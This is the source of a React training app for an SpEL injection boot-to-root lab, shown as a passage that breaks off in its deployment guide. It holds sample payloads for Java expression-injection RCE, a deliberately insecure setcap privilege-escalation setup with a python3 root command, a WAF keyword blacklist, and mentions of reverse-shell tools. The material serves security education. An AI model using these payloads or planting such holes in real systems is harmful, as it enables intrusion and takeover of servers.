import React, { useState, useEffect } from 'react';
import { View } from './types';
import {
  SPEL_CONTROLLER_CODE,
  DOCKER_COMPOSE_CODE,
  SETUP_SCRIPTS_CODE,
  DOCKERFILE_CODE,
  README_CODE,
  BUILD_SCRIPT
} from './constants';
import { CodeViewer } from './components/CodeViewer';
import { TerminalWindow } from './components/TerminalWindow';

// --- Components ---

const HintPanel: React.FC<{ title: string; hints: string[]; payloads: { label: string; code: string }[] }> = ({ title, hints, payloads }) => (
  <div className="w-80 bg-[#151515] border-l border-gray-800 p-6 overflow-y-auto hidden xl:block">
    <h3 className="text-kali-accent font-bold mb-4 uppercase text-sm tracking-wider">{title}</h3>
    
    <div className="mb-6">
      <h4 className="text-gray-400 text-xs font-bold mb-2 uppercase">解题思路</h4>
      <ul className="list-disc list-inside text-sm text-gray-500 space-y-2">
        {hints.map((h, i) => <li key={i}>{h}</li>)}
      </ul>
    </div>

    <div>
      <h4 className="text-gray-400 text-xs font-bold mb-2 uppercase">参考 Payload</h4>
      <div className="space-y-3">
        {payloads.map((p, i) => (
          <div key={i} className="group">
            <div className="text-xs text-gray-400 mb-1">{p.label}</div>
            <code 
              className="block bg-black border border-gray-800 p-2 rounded text-xs text-green-500 font-mono cursor-pointer hover:border-kali-blue transition break-all"
              onClick={() => navigator.clipboard.writeText(p.code)}
              title="点击复制"
            >
              {p.code}
            </code>
          </div>
        ))}
      </div>
    </div>
  </div>
);

const KillChainStep: React.FC<{ number: string; title: string; desc: string; tools: string[]; color: string }> = ({ number, title, desc, tools, color }) => (
  <div className={`relative p-6 rounded-lg border border-${color}-500/30 bg-gradient-to-br from-[#1a1a1a] to-black group hover:scale-[1.02] transition duration-300`}>
    <div className={`absolute -top-3 -left-3 w-8 h-8 rounded flex items-center justify-center font-bold text-black bg-${color}-500 shadow-lg shadow-${color}-500/20`}>
      {number}
    </div>
    <h3 className={`text-xl font-bold text-${color}-400 mb-2`}>{title}</h3>
    <p className="text-gray-400 text-sm mb-4 min-h-[40px]">{desc}</p>
    <div className="flex flex-wrap gap-2">
      {tools.map((t, i) => (
        <span key={i} className="px-2 py-1 bg-gray-800 rounded text-xs font-mono text-gray-300 border border-gray-700">
          {t}
        </span>
      ))}
    </div>
  </div>
);

const DocSection: React.FC<{ title: string; children: React.ReactNode }> = ({ title, children }) => (
  <section className="mb-12 border-b border-gray-800 pb-8">
    <h2 className="text-2xl font-bold text-kali-blue mb-6 border-l-4 border-kali-blue pl-4">{title}</h2>
    <div className="text-gray-300 leading-relaxed space-y-4">
      {children}
    </div>
  </section>
);

const DiagramBox: React.FC<{ title: string; children: React.ReactNode }> = ({ title, children }) => (
  <div className="my-6 border border-gray-700 bg-[#151515] rounded p-4">
    <div className="flex justify-center items-center min-h-[200px] font-mono text-sm relative">
      {children}
    </div>
    <p className="text-center text-xs text-gray-500 mt-4 font-serif italic">{title}</p>
  </div>
);

const App: React.FC = () => {
  const [currentView, setCurrentView] = useState<View>(View.DASHBOARD);
  
  // --- Simulation States ---
  const [directInput, setDirectInput] = useState('');
  const [directResult, setDirectResult] = useState<string | null>(null);
  
  const [concatInput, setConcatInput] = useState('');
  const [concatResult, setConcatResult] = useState<string | null>(null);

  const [bypassInput, setBypassInput] = useState('');
  const [bypassResult, setBypassResult] = useState<string | null>(null);

  const [blindInput, setBlindInput] = useState('');
  const [blindLoading, setBlindLoading] = useState(false);
  const [blindResult, setBlindResult] = useState<string | null>(null);
  
  const [rceCommand, setRceCommand] = useState('');
  const [rceOutput, setRceOutput] = useState<string[]>(['Welcome to SpEL RCE Console', 'Try: whoami, id, ls /']);
  const [isRceProcessing, setIsRceProcessing] = useState(false);

  // --- Nav Items ---
  const navItems = [
    { id: View.DASHBOARD, label: '任务简报 (Boot-to-Root)', icon: '⚡' },
    { id: View.DESIGN_DOCS, label: '系统设计文档 (Report)', icon: '📑' },
    { id: View.BUILD_GUIDE, label: '部署真实靶场', icon: '💿' },
    { type: 'divider' },
    { id: View.LAB_DIRECT, label: '训练 1: 直接注入', icon: '🟢' },
    { id: View.LAB_CONCAT, label: '训练 2: 拼接注入', icon: '🟡' },
    { id: View.LAB_BYPASS, label: '训练 3: WAF 绕过', icon: '🟠' },
    { id: View.LAB_BLIND, label: '训练 4: 盲注', icon: '🔴' },
    { id: View.LAB_RCE, label: 'Shell 模拟', icon: '💀' },
    { type: 'divider' },
    { id: View.SOURCE_JAVA, label: '白盒源码 (Java)', icon: '☕' },
    { id: View.SOURCE_DOCKER, label: '基础设施 (Docker)', icon: '🐳' },
    { id: View.SOURCE_SCRIPTS, label: '提权脚本 (Bash)', icon: '📜' },
    { id: View.README, label: '完整攻略', icon: '📘' },
  ];

  // --- Simulators ---

  const simulateDirectSpEL = () => {
    try {
      if (directInput.trim() === '1+1') setDirectResult('2');
      else if (directInput.includes('Runtime')) setDirectResult('java.lang.ProcessImpl@6f7902');
      else if (directInput.includes('ProcessBuilder')) setDirectResult('Error: EL1001E: Type conversion problem, cannot convert from java.lang.UNIXProcess to java.lang.String (RCE Successful!)');
      else if (directInput.includes("'hello'")) setDirectResult('hello');
      else if (directInput.match(/^\d+[\+\-\*\/]\d+$/)) {
        // eslint-disable-next-line no-eval
        setDirectResult(eval(directInput).toString());
      }
      else setDirectResult(`[服务器] 处理结果: ${directInput}`);
    } catch (e) {
      setDirectResult('SpEL 解析错误');
    }
  };

  const simulateConcat = () => {
    // Context: "Hello, ('" + input + "')!"
    // Goal: ') + T(java.lang.Runtime)... + ('
    if (concatInput.startsWith("')") && concatInput.endsWith("+ ('")) {
       setConcatResult("成功: 执行了注入的 Payload!");
    } else if (concatInput.includes("Runtime")) {
       setConcatResult("错误: 语法错误。你闭合字符串了吗？");
    } else {
       setConcatResult(`输出: Hello, ('${concatInput}')!`);
    }
  };

  const simulateBypass = () => {
    const blacklist = ["runtime", "exec", "processbuilder", "cmd", "bash", "sh"];
    const lower = bypassInput.toLowerCase();
    
    const blocked = blacklist.find(w => lower.includes(w));
    if (blocked) {
      setBypassResult(`[WAF] 403 Forbidden: 检测到恶意关键字 '${blocked}'。`);
      return;
    }

    if (bypassInput.includes("T(String)") || bypassInput.includes("ScriptEngineManager")) {
      setBypassResult("[服务器] 成功! 通过混淆/反射执行了 Payload。");
    } else if (bypassInput.trim().length > 0) {
      setBypassResult(`[服务器] 处理结果: ${bypassInput}`);
    } else {
      setBypassResult(null);
    }
  };

  const simulateBlind = () => {
    setBlindLoading(true);
    setBlindResult(null);
    
    // Simulate network delay based on payload
    let delay = 600; // default latency
    if (blindInput.includes("sleep(5000)")) delay = 5000;
    
    setTimeout(() => {
      setBlindLoading(false);
      setBlindResult("200 OK (无内容)");
    }, delay);
  };

  const simulateRCE = () => {
    setIsRceProcessing(true);
    const newOutput = [...rceOutput, `└─$ ${rceCommand}`];
    setRceOutput(newOutput);

    setTimeout(() => {
      let result = '';
      const cmd = rceCommand.trim();
      
      if (cmd === 'whoami') result = 'root';
      else if (cmd === 'id') result = 'uid=0(root) gid=0(root) groups=0(root)';
      else if (cmd === 'ls') result = 'app.jar\ninit.sql\npom.xml\nsrc';
      else if (cmd === 'ls /tmp') result = 'custom_find\nlogs.txt';
      else if (cmd === 'getcap -r /') result = '/usr/bin/python3 = cap_setuid+ep';
      else if (cmd.includes('nc') || cmd.includes('bash -i')) result = '[*] Reverse shell connection initiated...';
      else if (cmd === 'env') result = 'APP_SECRET_FLAG=flag{env_variables_are_not_secure}';
      else if (cmd === '') result = '';
      else result = `/bin/sh: ${cmd.split(' ')[0]}: command not found`;

      if (result) {
        setRceOutput([...newOutput, result]);
      } else {
        setRceOutput([...newOutput]);
      }
      setRceCommand('');
      setIsRceProcessing(false);
    }, 400);
  };

  // --- Views ---

  const renderContent = () => {
    switch (currentView) {
      case View.DASHBOARD:
        return (
          <div className="space-y-8 animate-in fade-in duration-500">
            <div className="border-b border-gray-800 pb-6">
              <h1 className="text-4xl font-bold text-white mb-4">SpEL Injection <span className="text-kali-blue">Boot-to-Root</span></h1>
              <p className="text-gray-400 text-lg leading-relaxed">
                这是一个双模式平台：在浏览器中<strong>学习原理 (Simulate)</strong>，然后生成并部署<strong>真实靶机 (Real World)</strong>。
                生成的靶机就像 VulnHub 的 <span className="text-white font-bold">DC-7</span> 或 <span className="text-white font-bold">Joker</span> 一样，
                需要你从端口扫描开始，一步步攻陷系统直至获取 Root 权限。
              </p>
            </div>

            <div>
              <h2 className="text-2xl font-bold text-white mb-6 flex items-center">
                <span className="mr-3 text-3xl">🗺️</span> 完整攻击杀链 (Kill Chain)
              </h2>
              
              <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-4 gap-6">
                <KillChainStep 
                  number="01"
                  title="信息收集 (Recon)"
                  desc="像攻击黑盒靶机一样，扫描端口发现开放的 HTTP 服务 (8080)。"
                  tools={['nmap', 'netdiscover', 'dirb']}
                  color="blue"
                />
                
                <KillChainStep 
                  number="02"
                  title="Web 突破 (Exploit)"
                  desc="发现 URL 参数中的 SpEL 注入点，绕过 WAF 过滤，构造反弹 Shell Payload。"
                  tools={['Burp Suite', 'Curl', 'Java Reflection']}
                  color="yellow"
                />
                
                <KillChainStep 
                  number="03"
                  title="立足点 (Foothold)"
                  desc="获取反弹 Shell (User: app)，收集敏感信息 (Env) 和 Flag 1。"
                  tools={['nc', 'bash -i', 'env']}
                  color="orange"
                />

                <KillChainStep 
                  number="04"
                  title="提权 (PrivEsc)"
                  desc="利用 SUID、Capabilities 或 Cron 任务配置错误，提权至 Root 并读取 Flag 2。"
                  tools={['GTFOBins', 'getcap', 'pspy64']}
                  color="red"
                />
              </div>
            </div>

            <div className="bg-[#111] p-6 rounded border border-gray-800 flex flex-col md:flex-row items-center justify-between gap-6">
              <div className="flex-1">
                <h3 className="text-lg font-bold text-white mb-2">准备好实战了吗？</h3>
                <p className="text-gray-400 text-sm">
                  点击“部署真实靶场”获取 Docker 脚本。在你的虚拟机运行后，它将完全作为一个黑盒服务运行。
                  忘掉这里的模拟器，打开你的 Kali 终端，开始真正的黑客行动。
                </p>
              </div>
              <button 
                onClick={() => setCurrentView(View.BUILD_GUIDE)} 
                className="bg-green-600 hover:bg-green-700 text-white px-8 py-3 rounded font-bold shadow-lg shadow-green-900/20 transition transform hover:scale-105"
              >
                生成靶场环境 &gt;
              </button>
            </div>
          </div>
        );

      case View.DESIGN_DOCS:
        return (
          <div className="max-w-4xl mx-auto bg-[#0a0a0a]">
            <div className="mb-10 text-center border-b border-gray-800 pb-8">
              <h1 className="text-4xl font-bold text-white mb-2">SpEL 注入漏洞靶场设计文档</h1>
              <p className="text-gray-500">System Design & Implementation Report</p>
            </div>

            {/* 1. 概要 */}
            <DocSection title="1. 概要 (Overview)">
              <p>
                <strong>渗透测试 (Penetration Testing)</strong> 是一种通过模拟恶意黑客的攻击方法，来评估计算机网络系统安全性的评估方法。其目的是发现系统中的安全漏洞，验证现有安全措施的有效性，并提供修复建议。
              </p>
              <p>
                设计本靶场的目的在于提供一个安全、合法且可控的实验环境。在真实网络中进行攻击是违法的，因此构建一个包含特定漏洞（如 SpEL 注入）和提权路径（如 SUID/Capabilities）的 Docker 容器，可以帮助网络安全学习者深入理解漏洞原理、掌握利用技术，并提升实战能力。本系统基于 Spring Boot 开发，完整模拟了从 Web 入口到 Linux Root 权限获取的全过程。
              </p>
            </DocSection>

            {/* 2. 技术简介 */}
            <DocSection title="2. 技术简介 (Technical Introduction)">
               <h3 className="text-lg font-bold text-white mt-4 mb-2">端口扫描技术</h3>
               <p>
                 端口扫描是渗透测试的第一步，通过向目标主机的 TCP/UDP 端口发送探测数据包，根据返回的响应判断端口状态（开放、关闭、过滤）。本项目中使用 Nmap 等工具来发现目标开放的 8080 (HTTP) 端口。
               </p>

               <h3 className="text-lg font-bold text-white mt-4 mb-2">目录爆破</h3>
               <p>
                 目录爆破利用字典文件对 Web 服务器的路径进行枚举请求，以发现未在页面中直接链接的隐藏资源（如 <code>/admin</code>, <code>/api</code>）。常用工具包括 Dirb, Gobuster 等。
               </p>

               <h3 className="text-lg font-bold text-white mt-4 mb-2">核心漏洞原理 (SpEL Injection & Log4j)</h3>
               <p>
                 类似于著名的 <strong>Log4j</strong> 漏洞（JNDI 注入），<strong>SpEL (Spring Expression Language) 注入</strong> 也是一种表达式语言注入漏洞。当应用程序将用户可控的输入未经严格过滤直接传递给 <code>ExpressionParser.parseExpression()</code> 方法时，攻击者可构造恶意表达式（如 <code>T(Runtime).getRuntime().exec()</code>）在服务器端执行任意 Java 代码，进而控制服务器。Log4j 利用了日志插值，而 SpEL 利用了框架的动态求值特性，两者的危害等级通常都为 Critical (RCE)。
               </p>
            </DocSection>

            {/* 3. 需求分析 */}
            <DocSection title="3. 需求分析 (Requirements Analysis)">
              <h3 className="text-lg font-bold text-white mt-4 mb-2">(1) 功能需求分析</h3>
              <ul className="list-disc list-inside space-y-2 pl-4">
                <li><strong>信息搜集能力:</strong> 学习者需能通过端口扫描发现服务，通过目录爆破发现 <code>/spel/vuln/*</code> 接口。</li>
                <li><strong>漏洞验证能力:</strong> 学习者需掌握 SpEL 基础语法，验证漏洞存在（如执行算术运算）。</li>
                <li><strong>WAF 绕过能力:</strong> 针对黑名单过滤，学习者需掌握反射 (Reflection) 或 字符串拼接技术。</li>
                <li><strong>提权能力:</strong> 学习者在获得低权限 Shell 后，需识别系统配置错误（SUID, Cron, Capabilities）并完成提权。</li>
              </ul>

              <h3 className="text-lg font-bold text-white mt-6 mb-4">(2) 系统用例设计 (System Use Case)</h3>
              <p className="mb-4">
                本系统主要参与者为“渗透测试学习者”。系统提供多个攻击面供用户交互。
              </p>
              
              <DiagramBox title="图 3-1 渗透测试用户用例图">
                <div className="flex flex-col items-center w-full max-w-lg">
                  {/* Actor */}
                  <div className="flex flex-col items-center mb-8">
                     <div className="w-8 h-8 rounded-full border-2 border-kali-blue bg-black mb-1"></div>
                     <div className="w-0.5 h-6 bg-kali-blue mb-1 relative">
                        <div className="absolute top-2 -left-3 w-6 h-0.5 bg-kali-blue"></div>
                     </div>
                     <div className="w-0.5 h-6 bg-kali-blue relative rotate-45 origin-top left-[-3px]"></div>
                     <div className="w-0.5 h-6 bg-kali-blue relative -rotate-45 origin-top left-[3px] top-[-24px]"></div>
                     <span className="text-kali-blue font-bold mt-[-20px]">渗透测试学习者</span>
                  </div>

                  {/* Use Cases */}
                  <div className="border-2 border-gray-700 p-6 rounded-lg w-full relative">
                    <span className="absolute -top-3 left-4 bg-[#151515] px-2 text-gray-500 text-xs">SpEL 靶场系统</span>
                    
                    <div className="grid grid-cols-2 gap-4">
                      {['端口扫描 (Port Scan)', '目录爆破 (Dir Busting)', 'Web 漏洞利用 (Exploit)', 'Shell 交互 (Netcat)', 'SUID 提权', 'Cron 提权'].map((uc, i) => (
                        <div key={i} className="border border-kali-blue/50 rounded-full py-2 px-4 text-center text-xs text-gray-300 shadow-[0_0_10px_rgba(43,132,234,0.1)]">
                          {uc}
                        </div>
                      ))}
                    </div>
                  </div>

                  {/* Lines (Visual only) */}
                  <div className="absolute top-[80px] w-px h-10 bg-gradient-to-b from-kali-blue to-transparent opacity-50"></div>
                </div>
              </DiagramBox>
            </DocSection>

            {/* 4. 系统设计 */}
            <DocSection title="4. 系统设计 (System Design)">
              <h3 className="text-lg font-bold text-white mt-4 mb-2">(1) 架构设计</h3>
              <p>
                系统采用 <strong>Docker 容器化架构</strong>，运行在 Linux (Kali/Ubuntu) 宿主机上。
                核心服务为一个基于 Spring Boot 的 Java Web 应用，后端连接 MySQL 5.7 数据库。
                OS 层基于 Alpine Linux，并在其中预置了特定的提权漏洞环境。
              </p>

              <h3 className="text-lg font-bold text-white mt-6 mb-2">(2) 功能模块划分 (8个模块)</h3>
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mt-4">
                <div className="border border-blue-900/50 bg-blue-900/10 p-4 rounded">
                  <h4 className="text-blue-400 font-bold mb-2">A. 信息搜集阶段</h4>
                  <ul className="text-sm space-y-1 text-gray-400">
                    <li>1. 端口开放模块 (Port 8080)</li>
                    <li>2. 目录结构暴露模块 (/spel/*)</li>
                    <li>3. 错误信息泄露模块 (Stacktrace)</li>
                  </ul>
                </div>
                <div className="border border-yellow-900/50 bg-yellow-900/10 p-4 rounded">
                  <h4 className="text-yellow-400 font-bold mb-2">B. 漏洞利用阶段</h4>
                  <ul className="text-sm space-y-1 text-gray-400">
                    <li>4. 直接注入模块 (Direct)</li>
                    <li>5. 拼接注入模块 (Concat)</li>
                    <li>6. WAF 过滤/绕过模块 (Bypass)</li>
                  </ul>
                </div>
                <div className="border border-red-900/50 bg-red-900/10 p-4 rounded">
                  <h4 className="text-red-400 font-bold mb-2">C. 权限提升阶段</h4>
                  <ul className="text-sm space-y-1 text-gray-400">
                    <li>7. SUID 配置错误模块 (find)</li>
                    <li>8. Capabilities 提权模块 (python3)</li>
                  </ul>
                </div>
              </div>

              <h3 className="text-lg font-bold text-white mt-6 mb-2">(3) 系统流程设计</h3>
              <p className="text-sm text-gray-400 mb-4">以下展示“漏洞利用阶段”的核心数据流。</p>
              
              <DiagramBox title="图 4-1 漏洞利用阶段流程图">
                 <div className="flex items-center gap-2 text-xs">
                    <div className="bg-gray-800 p-2 rounded border border-gray-600">攻击者输入 Payload</div>
                    <div className="text-gray-500">──HTTP GET──▶</div>
                    <div className="bg-blue-900/30 p-2 rounded border border-blue-600">
                       <div>SpelController</div>
                       <div className="text-[10px] text-gray-400">检查黑名单?</div>
                    </div>
                    <div className="text-gray-500">──通过──▶</div>
                    <div className="bg-yellow-900/30 p-2 rounded border border-yellow-600">
                       <div>SpelExpressionParser</div>
                       <div className="text-[10px] text-gray-400">Expression.getValue()</div>
                    </div>
                    <div className="text-gray-500">──执行──▶</div>
                    <div className="bg-red-900/30 p-2 rounded border border-red-600">
                       <div>System Runtime</div>
                       <div className="text-[10px] text-gray-400">exec(cmd)</div>
                    </div>
                 </div>
              </DiagramBox>

              <h3 className="text-lg font-bold text-white mt-6 mb-2">(4) 数据库设计</h3>
              <p className="mb-2">系统核心表 <code>search_logs</code> 用于记录所有注入尝试，既是业务功能，也是为了演示 SQL 与 Java 应用的交互。</p>
              <div className="overflow-x-auto">
                <table className="min-w-full text-sm text-left text-gray-400 border border-gray-700">
                  <thead className="bg-gray-800 text-gray-200 uppercase">
                    <tr>
                      <th className="px-4 py-2">字段名</th>
                      <th className="px-4 py-2">类型</th>
                      <th className="px-4 py-2">说明</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-gray-700">
                    <tr><td className="px-4 py-2 font-mono">id</td><td className="px-4 py-2">INT (PK)</td><td>自增主键</td></tr>
                    <tr><td className="px-4 py-2 font-mono">expression</td><td className="px-4 py-2">VARCHAR(255)</td><td>用户输入的 Payload</td></tr>
                    <tr><td className="px-4 py-2 font-mono">result</td><td className="px-4 py-2">VARCHAR(255)</td><td>执行结果或报错</td></tr>
                    <tr><td className="px-4 py-2 font-mono">ip_address</td><td className="px-4 py-2">VARCHAR(50)</td><td>来源 IP</td></tr>
                    <tr><td className="px-4 py-2 font-mono">created_at</td><td className="px-4 py-2">TIMESTAMP</td><td>记录时间</td></tr>
                  </tbody>
                </table>
              </div>
            </DocSection>

            {/* 5. 靶机实现 */}
            <DocSection title="5. 靶机实现 (Implementation)">
              <h3 className="text-lg font-bold text-white mt-4 mb-2">核心逻辑时序图 (Sequence Diagram)</h3>
              <DiagramBox title="图 5-1 SpEL 注入处理时序图">
                <div className="flex flex-col gap-4 w-3/4">
                  <div className="flex justify-between border-b border-gray-700 pb-2 mb-2 font-bold text-white">
                    <span>User</span>
                    <span>Controller</span>
                    <span>SpEL Parser</span>
                  </div>
                  <div className="flex justify-between items-center text-xs text-gray-400">
                    <span>1. GET /bypass?expression=T(Runtime)...</span>
                    <span className="flex-1 h-px bg-gray-600 mx-2 relative">
                      <span className="absolute right-0 -top-1">▶</span>
                    </span>
                    <span></span>
                  </div>
                  <div className="flex justify-between items-center text-xs text-gray-400">
                    <span></span>
                    <span className="w-8 h-8 bg-blue-500 rounded-full flex items-center justify-center text-black font-bold mx-auto z-10">Logic</span>
                    <span></span>
                  </div>
                  <div className="text-center text-[10px] text-yellow-500 my-[-10px]">Security Check (Blacklist)</div>
                  <div className="flex justify-between items-center text-xs text-gray-400">
                    <span></span>
                    <span className="flex-1 h-px bg-gray-600 mx-2 relative">
                      <span className="absolute right-0 -top-1">▶</span>
                    </span>
                    <span>2. parseExpression()</span>
                  </div>
                  <div className="flex justify-between items-center text-xs text-gray-400">
                    <span></span>
                    <span className="flex-1 h-px bg-dashed bg-gray-600 mx-2 relative">
                      <span className="absolute left-0 -top-1">◀</span>
                    </span>
                    <span>3. Return Result (Process/String)</span>
                  </div>
                </div>
              </DiagramBox>

              <h3 className="text-lg font-bold text-white mt-6 mb-2">设计与实现说明</h3>
              <div className="space-y-4">
                <div>
                  <h4 className="text-kali-blue font-bold">A. 漏洞环境 (Spring Boot)</h4>
                  <p className="text-sm">
                    使用 <code>SpelExpressionParser</code> 模拟真实业务场景。为了增加挑战性，在 <code>/bypass</code> 接口实现了简单的 WAF 逻辑，
                    通过遍历 <code>Arrays.asList("runtime", "exec"...)</code> 黑名单来拦截基础攻击。这迫使学习者使用 Java 反射 (Reflection) 或 
                    <code>ScriptEngineManager</code> 来绕过关键字检测。
                  </p>
                </div>
                
                <div>
                  <h4 className="text-kali-blue font-bold">B. 提权陷阱 (Privilege Escalation)</h4>
                  <p className="text-sm">
                    为了模拟企业内部常见的配置疏忽，我们在构建 Docker 镜像时预置了几个特定的不安全配置。
                    例如 <strong>Capabilities 提权</strong>：
                  </p>
                  <CodeViewer filename="setup_caps.sh" code={`# 关键实现代码
TARGET=$(readlink -f /usr/bin/python3)
# 给 python3 赋予 setuid 能力，允许非 root 用户以 root 身份运行代码
setcap cap_setuid+ep "$TARGET"`} language="bash" />
                  <p className="text-sm mt-2">
                    设计思路：现在的 Linux 发行版越来越安全，传统的内核漏洞提权越来越难。而 Capabilities（Linux内核能力）配置错误是现代容器环境中常见的提权路径。
                    我们通过给 python3 设置 <code>cap_setuid</code>，让学习者体验这种现代提权技术。
                  </p>
                </div>
              </div>
            </DocSection>

            {/* 6. 靶机测试 */}
            <DocSection title="6. 靶机测试 (Validation)">
               <p className="mb-4">以下是对靶场主要功能的验证测试记录。</p>
               
               <div className="space-y-4">
                 <div className="bg-black border border-gray-800 p-4 rounded">
                   <h4 className="text-green-500 font-mono text-sm mb-2">TEST 1: 端口扫描验证</h4>
                   <p className="text-gray-400 text-xs mb-2">执行命令: <code>nmap -p 8080 127.0.0.1</code></p>
                   <div className="font-mono text-xs text-gray-500">
                     PORT     STATE SERVICE<br/>
                     8080/tcp open  http-proxy
                   </div>
                   <div className="mt-2 text-green-400 text-xs font-bold">[PASS] 成功发现服务端口</div>
                 </div>

                 <div className="bg-black border border-gray-800 p-4 rounded">
                   <h4 className="text-green-500 font-mono text-sm mb-2">TEST 2: 漏洞触发验证 (Level 1)</h4>
                   <p className="text-gray-400 text-xs mb-2">Payload: <code>T(java.lang.Runtime).getRuntime().exec('id')</code></p>
                   <div className="font-mono text-xs text-gray-500">
                     Response: Error: EL1001E: Type conversion problem...
                   </div>
                   <div className="mt-2 text-green-400 text-xs font-bold">[PASS] 成功触发 RCE (通过报错确认代码已执行)</div>
                 </div>

                 <div className="bg-black border border-gray-800 p-4 rounded">
                   <h4 className="text-green-500 font-mono text-sm mb-2">TEST 3: 提权验证</h4>
                   <p className="text-gray-400 text-xs mb-2">Command: <code>python3 -c 'import os; os.setuid(0); os.system("id")'</code></p>
                   <div className="font-mono text-xs text-gray-500">
                     uid=0(root) gid=0(root) groups=0(root)
                   </div>
                   <div className="mt-2 text-green-400 text-xs font-bold">[PASS] 成功从 app 用户提权至 root</div>
                 </div>
               </div>
            </DocSection>

            <div className="text-center text-gray-600 text-sm mt-12 pb-8">
               &copy; 2023-2024 SpEL Injection Lab Project. All Rights Reserved.
            </div>
          </div>
        );

      case View.BUILD_GUIDE:
        return (
           <div className="space-y-6">
             <div className="flex items-center justify-between">
                <h2 className="text-2xl font-bold text-green-400">部署真实靶场 (Real World)</h2>
                <div className="text-xs px-2 py-1 bg-green-900/30 text-green-400 border border-green-500/30 rounded">
                  Status: Ready
                </div>
             </div>
             
             <div className="bg-yellow-900/20 border-l-4 border-yellow-500 p-4 text-yellow-200 text-sm">
               <strong>注意：</strong> 以下脚本将在你的本地 Docker 中启动一个<strong>真正的漏洞容器</strong>。
               请确保仅在受控的虚拟机（如 Kali Linux 或 Ubuntu）中运行。
             </div>

             <div className="bg-blue-900/20 border-l-4 border-blue-500 p-4 text-blue-200 text-sm mt-4">
                <strong>ℹ️ 目录说明：</strong> 脚本运行成功后，会在当前目录下生成名为 <code>spel-lab-env</code> 的文件夹。
                这是靶场的完整源代码和配置文件所在位置。如果需要查看日志或手工修改配置，请进入该目录：<code>cd spel-lab-env</code>。
             </div>

             <div className="bg-red-900/20 border-l-4 border-red-500 p-4 text-red-200 text-sm mt-4 rounded">
              <h4 className="font-bold text-red-300 flex items-center mb-2">
                 ⚠️ 无法拉取镜像？ (Context deadline exceeded)
              </h4>
              <p className="mb-2">
                如果遇到 <code>context deadline exceeded</code> 或下载卡住，请在运行脚本时<strong>选择 'y' </strong>以配置国内镜像加速器。
                脚本会自动配置 <code>daemon.json</code> 并重启 Docker 服务。
              </p>
            </div>

             <div className="space-y-4">
               <h3 className="font-bold text-white text-lg">🚀 启动步骤 (Linux/Mac)</h3>
               <ol className="list-decimal list-inside space-y-3 text-gray-300 text-sm">
                 <li>新建文件 <code>install_lab.sh</code> 并粘贴下方代码。</li>
                 <li>
                    <span className="text-yellow-400 font-bold">赋予执行权限 (关键)</span>: 
                    <code className="bg-gray-800 px-2 py-1 ml-2 rounded text-white font-mono border border-gray-700">chmod +x install_lab.sh</code>
                 </li>
                 <li>
                    <span className="text-red-400 font-bold">使用管理员运行</span>: 
                    <code className="bg-gray-800 px-2 py-1 ml-2 rounded text-white font-mono border border-gray-700">sudo ./install_lab.sh</code>
                 </li>
                 <li>脚本启动时，输入 <strong>y</strong> 并回车来应用网络修复。</li>
                 <li>看到 <span className="text-green-400 font-mono">[SUCCESS]</span> 或 <span className="text-green-400 font-mono">Good Luck</span> 后即可开始攻击。</li>
               </ol>
             </div>

             <div className="space-y-2 mt-6">
               <h3 className="font-bold text-white">一键安装脚本 (install_lab.sh)</h3>
               <CodeViewer filename="install_lab.sh" code={BUILD_SCRIPT} language="bash" />
             </div>

             {/* Troubleshooting Section */}
             <div className="mt-8 border border-red-900/50 bg-[#1a0505] rounded-lg overflow-hidden">
                <div className="bg-red-900/30 px-4 py-3 border-b border-red-900/50 flex items-center gap-2">
                  <span className="text-xl">🔧</span>
                  <h3 className="font-bold text-red-300">故障排查 (Troubleshooting)</h3>
                </div>
                <div className="p-6 space-y-6">
                  
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <div>
                       <h4 className="text-white font-bold mb-2 text-sm uppercase tracking-wider">🔴 现象：连接失败 / Connection Refused</h4>
                       <p className="text-gray-400 text-sm mb-4">
                         浏览器显示“无法建立连接”，即使脚本已运行完毕。
                       </p>
                       <div className="bg-black p-3 rounded border border-gray-800 font-mono text-xs text-gray-300">
                         <div className="mb-2 text-yellow-500">原因 1: Spring Boot 启动慢 (最常见)</div>
                         <p className="mb-2 text-gray-500">Java 应用需要 20-40秒 才能完成初始化并监听端口。请耐心等待。</p>
                         
                         <div className="mb-2 text-yellow-500">原因 2: 容器退出了</div>
                         <div className="mb-2">查看实时日志以确认状态:</div>
                         <code className="block text-green-400">sudo docker logs -f spel-lab-env-spel_app-1</code>
                         <p className="mt-2 text-gray-500">直到看到 "Started SpelLabApplication" 才是启动完成。</p>
                       </div>
                    </div>

                    <div>
                       <h4 className="text-white font-bold mb-2 text-sm uppercase tracking-wider">🟠 现象：Permission Denied</h4>
                       <p className="text-gray-400 text-sm mb-4">
                         执行 docker 命令时提示权限不足。这是因为当前用户不在 docker 组。
                       </p>
                       <div className="bg-black p-3 rounded border border-gray-800 font-mono text-xs text-gray-300">
                         <div className="mb-2"># 临时解决方案：在命令前加 sudo</div>
                         <code className="block text-green-400 mb-3">sudo docker ps</code>
                         
                         <div className="mb-2"># 永久解决方案 (需注销重登)</div>
                         <code className="block text-green-400">sudo usermod -aG docker $USER</code>
                       </div>
                    </div>
                  </div>

                  <div className="border-t border-gray-800 pt-4">
                    <h4 className="text-white font-bold mb-2 text-sm">常见日志错误解析</h4>
                    <ul className="text-xs space-y-2 text-gray-400 font-mono">
                       <li><span className="text-red-400">Connection refused (in logs)</span>: 数据库未就绪。脚本会自动重试，无需干预。</li>
                       <li><span className="text-red-400">Error: Invalid or corrupt jarfile</span>: Maven 构建失败。请重新运行脚本。</li>
                       <li><span className="text-red-400">Bind for 0.0.0.0:8080 failed</span>: 端口 8080 被占用。请关闭其他服务。</li>
                    </ul>
                  </div>

                </div>
             </div>

             <div className="mt-8 p-6 bg-green-900/10 border border-green-500/30 rounded-lg">
               <h3 className="text-xl font-bold text-green-400 mb-4 flex items-center">
                 ✅ 部署成功后 (Next Steps)
               </h3>
               <p className="text-gray-400 text-sm mb-4">当终端出现 "Good Luck, Have Fun." 且 <code>docker ps</code> 显示容器 Up 时，说明靶场运行正常。</p>
               <ul className="space-y-4 text-gray-300">
                 <li className="flex items-start gap-3">
                   <span className="bg-green-800 text-green-200 text-xs font-bold px-2 py-1 rounded mt-1">1</span>
                   <div>
                     <strong className="text-white block">连接靶机</strong>
                     <p className="text-sm text-gray-500 mb-2">点击下方链接测试连接（应返回 Hello 消息）：</p>
